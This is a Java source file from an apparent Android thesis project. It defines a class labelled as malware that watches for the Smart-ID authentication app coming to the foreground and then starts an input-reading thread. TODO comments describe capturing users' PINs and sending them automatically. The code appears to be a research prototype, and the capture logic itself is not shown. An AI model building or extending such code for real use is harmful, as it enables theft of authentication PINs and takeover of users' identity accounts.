package com.example.thesis;

import android.util.Log;

import java.util.concurrent.CountDownLatch;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    // TODO: changes in smartidcheck into other threads and this one aswell

    final private Converter converter;

    final private EventReader eventReader;
    final private Thread eventReaderThread;

    final private SmartIDCheck smartIDCheck;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private boolean knowPins = false;  // TODO: If I know the PIN's then auto send them.
    // TODO: if failed login screen then knowPins to false again.

    public Malware(Converter converter) {
        this.converter = converter;

        this.smartIDCheck = new SmartIDCheck();

        this.eventReader = new EventReader();
        this.eventReaderThread = new Thread(eventReader);
    }


    public synchronized void doStop() {
        // TODO: destroy process and input/outpureaders.
        this.doStop = true;
        this.eventReader.doStop();
        this.smartIDCheck.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");

        while (keepRunning()) {
            if (smartIDCheck.isSmartIDInForeground() && !eventReaderRunning) {
                eventReaderThread.start();
                eventReaderRunning = true;
            } else if (!smartIDCheck.isSmartIDInForeground() && eventReaderRunning){
                eventReader.doStop();
                eventReaderRunning = false;
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Log.i("Smart-ID Check", "Run loop interrupted!");
            }
        }
    }
}



